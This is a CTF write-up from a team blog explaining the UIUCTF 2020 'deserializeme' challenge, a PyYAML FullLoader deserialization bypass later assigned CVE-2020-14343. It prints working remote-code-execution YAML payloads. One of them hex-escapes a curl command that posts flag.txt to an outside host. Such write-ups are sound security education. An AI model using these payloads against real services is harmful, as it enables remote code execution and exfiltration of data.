<!DOCTYPE html>


    

<html lang="en-us" data-theme="dark">
<head>
    
        
<meta charset="utf-8">
<meta name="HandheldFriendly" content="True">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer-when-downgrade">

<title>UIUCTF 2020: deserializeme - Black Bauhinia</title>
<meta name="description" content="">

<link rel="icon" type="image/x-icon" href="https://b6a.black/favicon.ico">
<link rel="apple-touch-icon-precomposed" href="https://b6a.black/favicon.png">



    





    
    
    

    
        <link rel="stylesheet" href="https://b6a.black/css/style.09c94e06b3ec0503263ea0297febd3b62f3d6b2dafd8e813aa92a479e82bc955.css" integrity="sha256-CclOBrPsBQMmPqApf&#43;vTti89ay2v2OgTqpKkeegryVU=">
    





<meta property="og:title" content="UIUCTF 2020: deserializeme" />
<meta property="og:description" content="Update: It was assigned as CVE-2020-14343 after the contest.
 This was a fun challenge exploiting a deserialize service in Python.
The server is using pyYAML and Flask, with the source code below:
from flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(&#39;/&#39;, methods=[&#34;POST&#34;]) def pwnme(): if not re.fullmatch(b&#34;^[\n --/-\]a-}]*$&#34;, request.data, flags=re.MULTILINE): return &#34;Nice try!&#34;, 400 return yaml.load(request.data) if __name__ == &#39;__main__&#39;: app." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/" />
<meta property="article:published_time" content="2020-07-22T18:55:00+08:00" />
<meta property="article:modified_time" content="2020-07-22T18:55:00+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="UIUCTF 2020: deserializeme"/>
<meta name="twitter:description" content="Update: It was assigned as CVE-2020-14343 after the contest.
 This was a fun challenge exploiting a deserialize service in Python.
The server is using pyYAML and Flask, with the source code below:
from flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(&#39;/&#39;, methods=[&#34;POST&#34;]) def pwnme(): if not re.fullmatch(b&#34;^[\n --/-\]a-}]*$&#34;, request.data, flags=re.MULTILINE): return &#34;Nice try!&#34;, 400 return yaml.load(request.data) if __name__ == &#39;__main__&#39;: app."/>












    
</head>
<body>
    <a class="skip-main" href="#main">Skip to main content</a>
    <div class="container">
        <header class="common-header"> 
            
                <h1 class="site-title">
    <a href="/">Black Bauhinia</a>
</h1>

    <nav>
        
        
        <a class="" href="https://b6a.black/about-us/" title="">About Us</a>
        
    </nav>



            
        </header>
        <main id="main" tabindex="-1"> 
            
    
    
    <article class="post h-entry">
        <header class="post-header">
            <h1 class="p-name post-title">UIUCTF 2020: deserializeme</h1>
        </header>
        <div class="content e-content">
            <blockquote>
<p>Update: It was assigned as <a href="https://access.redhat.com/security/cve/cve-2020-14343">CVE-2020-14343</a> after the contest.</p>
</blockquote>

<p>This was a fun challenge exploiting a deserialize service in Python.</p>

<p>The server is using <a href="https://github.com/yaml/pyyaml/tree/5.3.1">pyYAML</a> and Flask, with the source code below:</p>
<pre><code class="language-python=" data-lang="python=">from flask import Flask, session, request, make_response
import yaml
import re
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)

@app.route(&#39;/&#39;, methods=[&#34;POST&#34;])
def pwnme():
    if not re.fullmatch(b&#34;^[\n --/-\]a-}]*$&#34;, request.data, flags=re.MULTILINE):
        return &#34;Nice try!&#34;, 400
    return yaml.load(request.data)

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre>
<p>Bascially it is a service to do yaml.load() to your input and print it (return) with limitation to block some special character (especially <code>.</code> and <code>_</code>)</p>

<p>The version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.</p>

<p>We noticed that <code>yaml.load</code> is &quot;unsafe&quot; by the README:</p>
<pre><code>When LibYAML bindings are installed, you may use fast LibYAML-based
parser and emitter as follows:

    &gt;&gt;&gt; yaml.load(stream, Loader=yaml.CLoader)
    &gt;&gt;&gt; yaml.dump(data, Dumper=yaml.CDumper)

If you don&#39;t trust the input stream, you should use:

    &gt;&gt;&gt; yaml.safe_load(stream)</code></pre>
<p>So we dig into the internals of yaml loader.</p>

<p>From the source code, when loader is not provided, it uses <code>FullLoader</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load</span>(stream, Loader<span style="color:#f92672">=</span>None):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Parse the first YAML document in a stream
</span><span style="color:#e6db74">    and produce the corresponding Python object.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> Loader <span style="color:#f92672">is</span> None:
        load_warning(<span style="color:#e6db74">&#39;load&#39;</span>)
        Loader <span style="color:#f92672">=</span> FullLoader

    loader <span style="color:#f92672">=</span> Loader(stream)
    <span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">return</span> loader<span style="color:#f92672">.</span>get_single_data()
    <span style="color:#66d9ef">finally</span>:
        loader<span style="color:#f92672">.</span>dispose()</code></pre></div>
<p>And <code>FullLoader</code> uses <code>FullConstructor</code> to construct the python objects in:
<a href="https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py">https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py</a></p>

<p>The differences of <code>FullConstructor</code> and <code>UnsafeConstructor</code> is, UnsafeConstructor can uses the yaml tag: <code>python/object/apply</code> (that can be used to call functions) and it doesn't block some reserved keywords.</p>

<p>From there, we guessed the challenge was to do an RCE using <code>python/object/new</code> tag (that is available in FullConstructor) and somehow bypass the CVE-2020-1747 <a href="https://github.com/yaml/pyyaml/pull/386">fixes</a>.
(With the POC <a href="https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1">here</a>)</p>

<p>The CVE-2020-1747 exploits the fact that user can input a object with a customized <code>extend</code> function, so that after the object is constructed (with <code>python/object/new</code> / <code>python/object/apply</code>), it can trigger the function <code>extend</code> as it is used by the constructor as below:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construct_python_object_apply</span>(self, suffix, node, newobj<span style="color:#f92672">=</span>False):
        <span style="color:#f92672">...</span>
        instance <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>make_python_instance(suffix, node, args, kwds, newobj)
        <span style="color:#66d9ef">if</span> state:
            self<span style="color:#f92672">.</span>set_python_instance_state(instance, state)
        <span style="color:#66d9ef">if</span> listitems:
            instance<span style="color:#f92672">.</span>extend(listitems)
        <span style="color:#66d9ef">if</span> dictitems:
            <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> dictitems:
                instance[key] <span style="color:#f92672">=</span> dictitems[key]
        <span style="color:#66d9ef">return</span> instance</code></pre></div>
<p>While the format of <code>python/object/apply</code> can supply states for the object, we can use <code>python/name</code> to reference a python internal function (exec, eval etc). We cannot use an module function as <code>.</code> and <code>_</code> is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by <code>FullConstructor</code>)</p>
<pre><code>#   !!python/object/apply       # (or !!python/object/new)
#   args: [ ... arguments ... ]
#   kwds: { ... keywords ... }
#   state: ... state ...
#   listitems: [ ... listitems ... ]
#   dictitems: { ... dictitems ... }
# or short format:
#   !!python/object/apply [ ... arguments ... ]</code></pre>
<p>The 5.3.1 fixes also blocked the key <code>extend</code> and <code>^__.*__$</code> to disallow setting those key with the state parameter.</p>

<p>We discovered that we can use <code>python/object/new</code> with <code>type</code> constructor (<code>type</code> is a type...) to create new types with some customized internal state. With this, we can bypass the <code>state</code> key block mechanism and freely set our object to something like this:</p>
<pre><code>!!python/object/new:type
  args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]</code></pre>
<p>With this we can put our commands to <code>listitems</code>, and the constructor will call <code>instance.extend(listitems)</code>, thus finish our RCE exploit.</p>

<p>Full payload:</p>
<pre><code>!!python/object/new:type
  args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]
  listitems: &#34;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&#34;</code></pre>
<p>(We changed <code>_</code> to <code>\x5f</code> and <code>.</code> to <code>\x2e</code> to bypass the regex limitation)</p>

<p>The intended solution uses <code>map</code> as a type (as it is a type in Python 3):</p>
<pre><code>!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;PAYLOAD_HERE&#39; ]]]</code></pre>
<p>This is essentially the python code <code>tuple(map(eval, &quot;PAYLOAD&quot;)))</code>, and this works as <code>map</code> and <code>tuple</code> are both class constructor (so it doesnt use any function as apply calls).</p>

<p>Thanks for the author for such cool challenge (basically used a 0day for the CTF challenge).</p>

        </div>
        


<div class="post-info">
    
        <div class="post-date dt-published">2020-07-22</div>
    
    
    <a class="post-hidden-url u-url" href="https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/">https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/</a>
    <a href=https://b6a.black/ class="p-name p-author post-hidden-author h-card" rel="me">[harrier ozetta]</a>


    <div class="post-taxonomies">
        
            
                <ul class="post-tags">
                    
                        <li><a href="https://b6a.black/tags/ctf">#ctf</a></li>
                    
                        <li><a href="https://b6a.black/tags/uiuctf">#uiuctf</a></li>
                    
                </ul>
        
    </div>
</div>

    </article>

    

    

    


        </main>
        
            <footer class="common-footer">
    
    

    <div class="common-footer-bottom">
        
        <div class="copyright">
            <p>Â© 2021<br>
            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>

            </p>  
        </div> 

        

    


   
    </div>

    <p class="h-card vcard">

    <a href=https://b6a.black/ class="p-name u-url url fn" rel="me"></a> 

    

    
</p> 
</footer>

        
    </div>
</body>
</html>
